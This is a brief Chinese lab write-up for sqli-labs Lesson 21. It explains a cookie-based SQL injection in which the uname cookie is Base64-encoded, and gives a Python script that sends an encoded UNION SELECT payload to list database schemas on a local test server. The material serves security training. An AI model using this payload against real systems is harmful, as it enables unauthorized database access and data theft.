# Lesson-21
```
Base64编码-,-明注Cookie注入)
```

此题和上题也是差不多 , 只不过在Cookie中把uname这个字段Base64了一下 , 将注入语句Base64编码以后再发送HTTP请求就可以了 , 还有就是sql语句有一点变化 , 加上了括号

```
import requests
import base64

url = "http://127.0.0.1/Less-21/"

postDate = {
	'uname':'admin',
	'passwd':'admin'
}

headers = {
	'Host':'127.0.0.1',
	'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0',
	'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
	'Accept-Language':'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
	'Accept-Encoding':'gzip, deflate',
	'Referer':'http://127.0.0.1/Less-20/index.php',
	'Cookie':"uname="+base64.b64encode("\') union select 1,group_concat(schema_name),3 from information_schema.schemata-- "),
	'Connection':'keep-alive',
	'Upgrade-Insecure-Requests':'1',
	'Cache-Control':'max-age=0'
}

content = (requests.post(url, data=postDate, headers=headers).text)
print(content)
```
